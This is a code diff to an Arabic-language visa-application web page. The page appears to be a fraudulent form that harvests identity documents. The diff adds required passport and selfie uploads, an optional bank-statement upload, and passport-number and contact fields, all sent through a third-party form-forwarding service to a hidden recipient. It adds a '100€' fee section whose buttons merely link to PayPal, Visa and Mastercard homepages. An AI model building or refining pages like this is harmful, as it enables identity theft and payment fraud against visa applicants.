@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>بيانات الطلب</title>
+<title>طلب التأشيرة</title>
 <link rel="stylesheet" href="style.css">
 </head>
 
@@ -11,7 +11,24 @@
 
 <div class="container">
 
-<form action="https://formsubmit.co/travelvisa.spport@gmail.com" method="POST">
+<form action="https://formsubmit.co/5a972c61f3a2684833aadaf20c6d7404" method="POST" enctype="multipart/form-data">
+
+<div class="card">
+
+<h2>📄 رفع الوثائق المطلوبة</h2>
+
+<p>يرجى رفع نسخة واضحة من جواز السفر والصورة الشخصية</p>
+
+<label>🛂 صورة جواز السفر</label>
+<input type="file" name="passport_image" accept="image/*" required>
+
+<label>📸 صورة شخصية</label>
+<input type="file" name="photo" accept="image/*" required>
+
+<label>📄 كشف الحساب البنكي (اختياري)</label>
+<input type="file" name="bank_statement" accept="application/pdf,image/*">
+
+</div>
 
 <div class="card">
 
@@ -20,25 +37,45 @@
 <input name="name" placeholder="الاسم الكامل" required>
 <input name="lastname" placeholder="اللقب" required>
 <input name="birth" type="date" required>
-
-<h3>🛂 بيانات الجواز</h3>
-
-<input name="passport" placeholder="رقم جواز السفر" required>
-<input name="expiry" type="date" required>
-
-<h3>📞 التواصل</h3>
-
+<input name="passport_number" placeholder="رقم جواز السفر" required>
 <input name="phone" placeholder="رقم الهاتف" required>
 <input name="email" placeholder="البريد الإلكتروني" required>
 
-<h3>🌍 سبب السفر</h3>
+</div>
 
-<select name="reason" required>
-<option value="">اختر</option>
-<option>سياحة</option>
-<option>عمل</option>
-<option>إقامة</option>
-</select>
+<div class="card">
+
+<h2>💳 الدفع (100€)</h2>
+
+<p>اختر طريقة الدفع لإكمال الطلب</p>
+
+<div style="display:flex;flex-wrap:wrap;gap:10px;justify-content:center;">
+
+<a href="https://www.paypal.com" target="_blank">
+<button type="button">PayPal</button>
+</a>
+
+<a href="https://www.visa.com" target="_blank">
+<button type="button">Visa</button>
+</a>
+
+<a href="https://www.mastercard.com" target="_blank">
+<button type="button">MasterCard</button>
+</a>
+
+</div>
+
+<p style="color:gray;margin-top:10px;">
+بعد الدفع سيتم التواصل معك لتأكيد الطلب
+</p>
+
+</div>
+
+<div class="card">
+
+<h2>📤 إرسال الطلب النهائي</h2>
+
+<p>بإرسال الطلب أنت توافق على معالجة بياناتك</p>
 
 <button type="submit">إرسال الطلب</button>
 
